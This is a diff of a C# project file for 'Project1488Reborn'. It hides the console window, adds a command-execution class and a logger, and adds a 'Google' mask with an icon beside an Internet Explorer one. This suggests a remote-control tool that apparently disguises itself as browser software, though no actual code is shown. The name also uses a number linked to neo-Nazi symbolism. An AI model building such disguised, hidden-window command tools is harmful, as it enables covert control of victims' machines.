@@ -5,7 +5,7 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{09986043-79E9-4F78-B2A1-2AE82C6257BA}</ProjectGuid>
-    <OutputType>Exe</OutputType>
+    <OutputType>WinExe</OutputType>
     <RootNamespace>Project1488Reborn</RootNamespace>
     <AssemblyName>Project1488Reborn</AssemblyName>
     <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
@@ -36,6 +36,9 @@
   <PropertyGroup>
     <ApplicationIcon>1.ico</ApplicationIcon>
   </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="HornetInc.JsonAPI">
       <HintPath>..\HornetInc.JsonAPI\bin\Debug\HornetInc.JsonAPI.dll</HintPath>
@@ -53,11 +56,14 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Commands\CCmd.cs" />
     <Compile Include="Commands\CMessage.cs" />
     <Compile Include="Commands\Command.cs" />
     <Compile Include="Commands\CPing.cs" />
     <Compile Include="Config.cs" />
+    <Compile Include="Loger.cs" />
     <Compile Include="Masks\Mask.cs" />
+    <Compile Include="Masks\MGoogle.cs" />
     <Compile Include="Masks\MInternetExplorer.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -86,6 +92,7 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="1.ico" />
+    <None Include="Resources\Google.ico" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
